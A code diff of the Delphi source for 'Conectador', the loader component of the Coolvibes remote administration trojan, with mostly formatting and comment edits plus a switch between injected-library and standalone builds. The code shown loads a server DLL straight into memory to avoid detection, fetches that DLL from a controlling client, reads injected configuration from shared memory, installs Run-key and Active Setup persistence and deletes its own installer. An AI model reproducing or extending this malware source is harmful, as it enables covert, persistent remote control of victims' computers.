@@ -11,8 +11,8 @@
 
      El equipo Coolvibes
 *)
-library Conectador; //Para inyectar descomentar
-//program Conectador;   //para no inyectar descomentar
+//library Conectador; //Para inyectar descomentar
+program Conectador; //Para no inyectar descomentar
 uses
   Windows,
   BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
@@ -102,16 +102,16 @@ begin
 
   if(length(content) > 0) then
   begin
-    Module := BTMemoryLoadLibary(p, m_DllDataSize);  
+    Module := BTMemoryLoadLibary(p, m_DllDataSize);
     if Module <> nil then
     begin
       CargarServidor := BTMemoryGetProcAddress(Module, 'CargarServidor');  //Para mas indetectabilidad quizas se le deberia cambiar el nombre a la funcion 'CargarServidor'
       CargarServidor(@configuracion); //Se inicia Coolserver.dll y se le manda la configuracion
     end;
   end;
-  
+
   Loaded := Loaded+1;  //Veces que ha sido cargada
-  if(Loaded>10) then 
+  if(Loaded>10) then
   begin
     if(fileexists(Pchar(path))) then
       deletefile(Pchar(path));      //Falla la carga de la dll mas de 10 veces... la borramos y se la pedimos otra vez al cliente
@@ -237,7 +237,7 @@ begin
    isize := strtoint(ssize);//ya tenemos el tamaño
     if(isize <> 0) then
     begin
-    
+
    AssignFile(plugin, dllc);
    Rewrite(plugin, 1);
    Totalread := 0;
@@ -276,7 +276,7 @@ procedure loadsettings();
 var
     ConfigLeida: PSettings;
 begin
-     //leerlo de la config?
+     //Leerlo de la config?
   if ReadSettings(ConfigLeida) = True then   //Como no estoy injectado puedo leer la configuracion como siempre
     begin
       Configuracion.sHosts                       := ConfigLeida^.sHosts;
@@ -295,51 +295,51 @@ begin
     end
     else
     begin
-        //Estoy corriendo como injectado, así que tengo que leer la configuración escrita por Injector.exe desde memoria
-
+      //Estoy corriendo como injectado, así que tengo que leer la configuración escrita por Injector.exe desde memoria
       MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');
-
 
       if(MCompartida <> 0) then //Leida con Éxito :D
       begin
         ConfigCompartida:=MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
-           //quizás habría que guardar esta configuración cifrada...
-         Configuracion.sHosts                    := ConfigCompartida.sHosts;
-         Configuracion.sID                      := ConfigCompartida.sID;
-         Configuracion.bCopiarArchivo           := ConfigCompartida.bCopiarArchivo;
-         Configuracion.sFileNameToCopy          := ConfigCompartida.sFileNameToCopy;
-         Configuracion.sCopyTo                  := ConfigCompartida.sCopyTo;
-         Configuracion.bCopiarConFechaAnterior  := ConfigCompartida.bCopiarConFechaAnterior;
-         Configuracion.bMelt                    := ConfigCompartida.bMelt;
-         Configuracion.bArranqueRun             := ConfigCompartida.bArranqueRun;
-         Configuracion.sRunRegKeyName           := ConfigCompartida.sRunRegKeyName;
-         Configuracion.bArranqueActiveSetup     := ConfigCompartida.bArranqueActiveSetup;
-         Configuracion.sActiveSetupKeyName      := ConfigCompartida.sActiveSetupKeyName;
-         Configuracion.sPluginName              := ConfigCompartida.sPluginName;
-         Configuracion.sInyectadorFile          := ConfigCompartida.sInyectadorFile;
-         UnmapViewOfFile(ConfigCompartida);
-         CloseHandle(MCompartida);    //La escribimos
-         dllc := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+Configuracion.sPluginName;
-
+        //Quizás habría que guardar esta configuración cifrada...
+        Configuracion.sHosts                   := ConfigCompartida.sHosts;
+        Configuracion.sID                      := ConfigCompartida.sID;
+        Configuracion.bCopiarArchivo           := ConfigCompartida.bCopiarArchivo;
+        Configuracion.sFileNameToCopy          := ConfigCompartida.sFileNameToCopy;
+        Configuracion.sCopyTo                  := ConfigCompartida.sCopyTo;
+        Configuracion.bCopiarConFechaAnterior  := ConfigCompartida.bCopiarConFechaAnterior;
+        Configuracion.bMelt                    := ConfigCompartida.bMelt;
+        Configuracion.bArranqueRun             := ConfigCompartida.bArranqueRun;
+        Configuracion.sRunRegKeyName           := ConfigCompartida.sRunRegKeyName;
+        Configuracion.bArranqueActiveSetup     := ConfigCompartida.bArranqueActiveSetup;
+        Configuracion.sActiveSetupKeyName      := ConfigCompartida.sActiveSetupKeyName;
+        Configuracion.sPluginName              := ConfigCompartida.sPluginName;
+        Configuracion.sInyectadorFile          := ConfigCompartida.sInyectadorFile;
+        UnmapViewOfFile(ConfigCompartida);
+        CloseHandle(MCompartida); //La escribimos
+        dllc := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+Configuracion.sPluginName;
       end
       else
-      begin   //Para Debug
-       // Exitprocess(0);
-        Configuracion.sHosts   := '127.0.0.1:80¬';
-        Configuracion.sID     := 'Coolserver';
-        Configuracion.bCopiarArchivo := false;
-        Configuracion.sFileNameToCopy := 'coolserver.exe';
-        Configuracion.sCopyTo := '%windir%\lol\';
+      begin
+        //Para Debug
+        //Exitprocess(0);
+        Configuracion.sHosts                  := '127.0.0.1:80¬';
+        Configuracion.sID                     := 'Coolserver';
+        Configuracion.bCopiarArchivo          := false;
+        Configuracion.sFileNameToCopy         := 'coolserver.exe';
+        Configuracion.sCopyTo                 := '%windir%\lol\';
         Configuracion.bCopiarConFechaAnterior := False;
-        Configuracion.bMelt   := False;
-        Configuracion.bArranqueRun := true;
-        Configuracion.sRunRegKeyName := 'Coolserver';
-        Configuracion.sPluginName := 'coolserver.dll';
-        Configuracion.sActiveSetupKeyName := 'test';
-        Configuracion.bArranqueActiveSetup := true;
+        Configuracion.bMelt                   := False;
+        Configuracion.bArranqueRun            := true;
+        Configuracion.sRunRegKeyName          := 'Coolserver';
+        Configuracion.bArranqueActiveSetup    := true;
+        Configuracion.sActiveSetupKeyName     := 'test';
+        Configuracion.sPluginName             := 'coolserver.dll';
+				//Configuracion.sInyectadorFile         := '';
         dllc := GetCurrentDirectory+Configuracion.sPluginName;
+        //Fin de Para debug
       end;
-end;
+  end;
 
       ClaveCifrado1 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)+1]);
       ClaveCifrado2 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)]);
@@ -353,15 +353,15 @@ begin
     while fileExists(dllc) do
       loaddll(dllc);
     iniciar();
-    sleep(10000); //cada 10 segundos
+    sleep(10000); //Cada 10 segundos
   end;
 end;
 
 
 begin
-  if ParamStr(1) = '\melt' then  //esto pasará solamente si no tenemos la opción de inyectar
+  if ParamStr(1) = '\melt' then  //Esto pasará solamente si no tenemos la opción de inyectar
     begin
-      //borro el archivo de instalación, reintento 5 veces por si las moscas :)
+      //Borro el archivo de instalación, reintento 5 veces por si las moscas :)
       for i := 1 to 5 do
       begin
         if not FileExists(ParamStr(2)) then
@@ -375,5 +375,5 @@ begin
   loadsettings();  //Leemos la configuración
   Instalar();
   BeginThread(nil,0,Addr(Main),0,0,TID);
-  exitthread(0);   //si tenemos la opción de persistencia activa esto le avisará que hemos leido la configuración
+  exitthread(0);   //Si tenemos la opción de persistencia activa esto le avisará que hemos leido la configuración
 end.
